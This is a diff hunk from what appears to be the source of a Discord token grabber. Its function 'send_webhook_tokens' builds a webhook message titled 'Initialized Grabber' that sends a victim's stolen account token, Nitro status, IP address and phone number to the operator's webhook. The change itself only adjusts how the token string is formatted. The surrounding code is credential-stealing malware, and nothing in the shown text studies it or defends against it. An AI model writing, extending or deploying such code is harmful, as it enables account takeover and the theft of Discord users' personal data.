@@ -92,7 +92,7 @@ const send_webhook_tokens = async (webhook) => {
                                 "title": 'Initialized Grabber',
                                 "color": "12740607",
                                 "fields": [
-                                    { "name": `<a:aura:1087044506542674091> ${token_type}:`, "value": "```" + token.replace("browsers_tokens_", "") + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
+                                    { "name": `<a:aura:1087044506542674091> ${token_type}:`, "value": "```" + token + "```" + `\n[[Click Here To Copy Your Token]](${copy})` },
                                     { "name": "<a:aura:1101739920319590420> Nitro:", "value": `${discord.nitroType}`, inline: true },
                                     { "name": "<a:aura:995172580988309664> IP Adress", "value": `\`${system.IP}\``, inline: true },
                                     { "name": "<a:aura:863691953531125820> Phone", "value": `\`${discord.phone}\``, inline: true },
